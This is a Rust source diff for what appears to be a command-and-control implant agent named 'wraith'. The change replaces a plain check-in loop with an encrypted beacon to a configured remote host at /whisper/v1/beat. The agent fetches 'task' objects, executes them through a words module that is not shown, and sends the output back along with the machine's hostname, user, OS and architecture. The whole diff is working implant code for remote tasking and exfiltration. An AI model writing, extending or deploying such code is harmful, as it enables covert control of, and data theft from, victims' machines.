@@ -1,9 +1,12 @@
 // SPDX-License-Identifier: AGPL-3.0-only
+mod words;
+
 use std::env;
 use std::error::Error;
 use std::io::{Read, Write};
 use std::net::{IpAddr, TcpStream};
 use std::sync::Arc;
+use std::time::{SystemTime, UNIX_EPOCH};
 
 use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Nonce};
@@ -59,10 +62,10 @@ fn main() -> Result<(), Box<dyn Error>> {
 
     let hello = json!({
         "id": random_hex(8),
-        "hostname": hostname(),
+        "hostname": words::hostname(),
         "os": env::consts::OS,
         "arch": env::consts::ARCH,
-        "user": username(),
+        "user": words::username(),
     });
     let (nonce, ct) = seal(&key, &hello.to_string())?;
     let complete = json!({
@@ -87,33 +90,70 @@ fn main() -> Result<(), Box<dyn Error>> {
         shard_id, ack["session_id"], ack["cadence_s"]
     );
 
-    if loop_mode {
-        loop {
-            let res = send_word(&key, &shard_id, &host, port, "breath")?;
-            println!("word=breath result={} ok={}", res["result"], res["ok"]);
-            std::thread::sleep(std::time::Duration::from_secs(interval));
+    // beats carry results back and tasks forward
+    let mut pending: Option<Value> = None;
+    loop {
+        match beat(&key, &shard_id, &host, port, pending.clone()) {
+            Ok(ack) => {
+                pending = None;
+                match ack.get("task").filter(|t| !t.is_null()) {
+                    Some(task) => {
+                        let word = task["word"].as_str().unwrap_or("").to_string();
+                        let args = task.get("args").cloned().unwrap_or_else(|| json!({}));
+                        let res = words::run(&word, &args);
+                        println!("word={word} ok={}", res.ok);
+                        if res.output.is_empty() {
+                            println!("(no output)");
+                        } else {
+                            println!("{}", res.output);
+                        }
+                        let task_id = task["id"].as_str().unwrap_or("").to_string();
+                        pending = Some(json!({
+                            "task_id": task_id,
+                            "word": word,
+                            "ok": res.ok,
+                            "result": res.output,
+                            "ts": now_unix(),
+                        }));
+                    }
+                    None => println!("word=breath ok=true result=alive"),
+                }
+            }
+            Err(e) => eprintln!("wraith: beat failed: {e}"),
         }
+        if !loop_mode {
+            break;
+        }
+        std::thread::sleep(std::time::Duration::from_secs(interval));
     }
-    let res = send_word(&key, &shard_id, &host, port, "breath")?;
-    println!("word=breath result={} ok={}", res["result"], res["ok"]);
     Ok(())
 }
 
-fn send_word(
+fn beat(
     key: &[u8; 32],
     shard_id: &str,
     host: &str,
     port: u16,
-    word: &str,
+    result: Option<Value>,
 ) -> Result<Value, Box<dyn Error>> {
-    let payload = json!({"shard_id": shard_id, "word": word});
+    let mut payload = json!({ "shard_id": shard_id });
+    if let Some(r) = result {
+        payload["result"] = r;
+    }
     let (nonce, ct) = seal(key, &payload.to_string())?;
-    let req = json!({"shard_id": shard_id, "envelope": {"nonce": nonce, "ct": ct}});
-    let (status, body) = https_request(host, port, "POST", "/whisper/v1/word", &req.to_string())?;
+    let req = json!({ "shard_id": shard_id, "envelope": { "nonce": nonce, "ct": ct } });
+    let (status, body) = https_request(host, port, "POST", "/whisper/v1/beat", &req.to_string())?;
     check_status(status)?;
     let env: Value = serde_json::from_str(&body)?;
     let plain = open(key, env["nonce"].as_str().unwrap(), env["ct"].as_str().unwrap())?;
     Ok(serde_json::from_str(&plain)?)
+}
+
+fn now_unix() -> i64 {
+    SystemTime::now()
+        .duration_since(UNIX_EPOCH)
+        .map(|d| d.as_secs() as i64)
+        .unwrap_or(0)
 }
 
 fn parse_url(url: &str) -> Result<(String, u16), Box<dyn Error>> {
@@ -284,16 +324,4 @@ fn random_hex(n: usize) -> String {
     let mut bytes = vec![0u8; n];
     rand::rngs::OsRng.fill_bytes(&mut bytes);
     to_hex(&bytes)
-}
-
-fn hostname() -> String {
-    env::var("HOSTNAME")
-        .or_else(|_| env::var("COMPUTERNAME"))
-        .unwrap_or_else(|_| "unknown".to_string())
-}
-
-fn username() -> String {
-    env::var("USER")
-        .or_else(|_| env::var("USERNAME"))
-        .unwrap_or_else(|_| "unknown".to_string())
 }
